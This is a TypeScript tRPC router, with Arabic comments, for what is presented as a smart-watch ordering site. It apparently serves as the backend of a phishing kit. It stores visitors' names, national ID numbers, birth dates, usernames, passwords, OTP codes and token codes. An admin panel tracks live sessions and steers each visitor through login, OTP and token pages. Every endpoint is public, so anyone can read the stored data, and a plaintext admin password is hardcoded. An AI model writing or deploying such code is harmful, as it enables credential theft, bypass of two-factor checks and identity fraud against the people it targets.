import { COOKIE_NAME } from "@shared/const";
import { getSessionCookieOptions } from "./_core/cookies";
import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, router, protectedProcedure } from "./_core/trpc";
import { z } from "zod";
import { 
  createSmartWatchOrder, 
  getSmartWatchOrderById, 
  updateSmartWatchOrder, 
  getAllSmartWatchOrders,
  getActiveSessionsCount,
  createActiveSession,
  getActiveSessions,
  updateActiveSession,
  getActiveSessionBySessionId
} from "./db";
import { TRPCError } from "@trpc/server";

export const appRouter = router({
  system: systemRouter,
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return {
        success: true,
      } as const;
    }),
  }),

  // ============ طلبات الساعات الذكية ============
  orders: router({
    // إنشاء طلب جديد
    create: publicProcedure
      .input(z.object({
        fullName: z.string().min(1),
        nationalId: z.string().length(14),
        idExpiryDate: z.string(),
        phoneNumber: z.string().min(1),
        birthDate: z.string(),
        email: z.string().email(),
        username: z.string().min(1),
        password: z.string().min(1),
        country: z.string().optional(),
        ipAddress: z.string().optional(),
      }))
      .mutation(async ({ input, ctx }) => {
        try {
          const order = await createSmartWatchOrder({
            fullName: input.fullName,
            nationalId: input.nationalId,
            idExpiryDate: input.idExpiryDate,
            phoneNumber: input.phoneNumber,
            birthDate: input.birthDate,
            email: input.email,
            username: input.username,
            password: input.password,
            country: input.country,
            ipAddress: input.ipAddress,
            currentPage: "personalData",
            personalDataCompleted: true,
          });
          return order;
        } catch (error) {
          console.error("Error creating order:", error);
          throw new TRPCError({
            code: "INTERNAL_SERVER_ERROR",
            message: "فشل إنشاء الطلب",
          });
        }
      }),

    // الحصول على طلب بواسطة ID
    getById: publicProcedure
      .input(z.object({ id: z.number() }))
      .query(async ({ input }) => {
        return getSmartWatchOrderById(input.id);
      }),

    // تحديث حالة الطلب
    updateStatus: publicProcedure
      .input(z.object({
        id: z.number(),
        currentPage: z.string(),
        otpCode: z.string().optional(),
        otpVerified: z.boolean().optional(),
        tokenCode: z.string().optional(),
        tokenVerified: z.boolean().optional(),
      }))
      .mutation(async ({ input }) => {
        const updates: any = {
          currentPage: input.currentPage,
        };

        if (input.otpCode !== undefined) updates.otpCode = input.otpCode;
        if (input.otpVerified !== undefined) updates.otpVerified = input.otpVerified;
        if (input.tokenCode !== undefined) updates.tokenCode = input.tokenCode;
        if (input.tokenVerified !== undefined) updates.tokenVerified = input.tokenVerified;

        // تحديث حالات الخطوات
        if (input.currentPage === "login") updates.personalDataCompleted = true;
        if (input.currentPage === "otp") updates.loginCompleted = true;
        if (input.currentPage === "token") updates.otpCompleted = true;
        if (input.currentPage === "success") {
          updates.tokenCompleted = true;
          updates.status = "completed";
          updates.completedAt = new Date();
        }

        return updateSmartWatchOrder(input.id, updates);
      }),

    // الحصول على جميع الطلبات
    getAll: publicProcedure.query(async () => {
      return getAllSmartWatchOrders();
    }),
  }),

  // ============ الجلسات النشطة ============
  sessions: router({
    // إنشاء جلسة جديدة
    create: publicProcedure
      .input(z.object({
        sessionId: z.string(),
        ipAddress: z.string(),
        country: z.string().optional(),
        userAgent: z.string().optional(),
      }))
      .mutation(async ({ input }) => {
        return createActiveSession({
          sessionId: input.sessionId,
          ipAddress: input.ipAddress,
          country: input.country,
          userAgent: input.userAgent,
          isActive: true,
        });
      }),

    // الحصول على عدد الجلسات النشطة
    getActiveCount: publicProcedure.query(async () => {
      return getActiveSessionsCount();
    }),

    // الحصول على جميع الجلسات النشطة
    getActive: publicProcedure.query(async () => {
      return getActiveSessions();
    }),

    // تحديث آخر نشاط في الجلسة
    updateActivity: publicProcedure
      .input(z.object({
        sessionId: z.string(),
      }))
      .mutation(async ({ input }) => {
        const session = await getActiveSessionBySessionId(input.sessionId);
        if (session) {
          return updateActiveSession(session.id, {
            lastActivityAt: new Date(),
          });
        }
        return null;
      }),
  }),

  // ============ لوحة التحكم ============
  admin: router({
    // التحقق من كلمة المرور
    login: publicProcedure
      .input(z.object({ password: z.string() }))
      .mutation(async ({ input }) => {
        const correctPassword = "Ha09876@@";
        if (input.password === correctPassword) {
          return { success: true };
        }
        throw new TRPCError({
          code: "UNAUTHORIZED",
          message: "كلمة المرور غير صحيحة",
        });
      }),

    // الحصول على جميع الطلبات (للمشرف)
    getAllOrders: publicProcedure.query(async () => {
      return getAllSmartWatchOrders();
    }),

    // تحديث حالة الطلب (قبول/رفض)
    updateOrderStatus: publicProcedure
      .input(z.object({
        id: z.number(),
        status: z.enum(["pending", "approved", "rejected", "completed"]),
      }))
      .mutation(async ({ input }) => {
        return updateSmartWatchOrder(input.id, {
          status: input.status,
        });
      }),

    // إعادة توجيه المستخدم إلى صفحة معينة
    redirectUser: publicProcedure
      .input(z.object({
        id: z.number(),
        page: z.enum(["personalData", "login", "otp", "token", "loading", "success"]),
      }))
      .mutation(async ({ input }) => {
        return updateSmartWatchOrder(input.id, {
          currentPage: input.page,
        });
      }),

    // الحصول على إحصائيات لوحة التحكم
    getStats: publicProcedure.query(async () => {
      const activeCount = await getActiveSessionsCount();
      const allOrders = await getAllSmartWatchOrders();
      
      return {
        activeVisitors: activeCount,
        totalOrders: allOrders.length,
        completedOrders: allOrders.filter(o => o.status === "completed").length,
        pendingOrders: allOrders.filter(o => o.status === "pending").length,
        approvedOrders: allOrders.filter(o => o.status === "approved").length,
        rejectedOrders: allOrders.filter(o => o.status === "rejected").length,
      };
    }),
  }),
});

export type AppRouter = typeof appRouter;
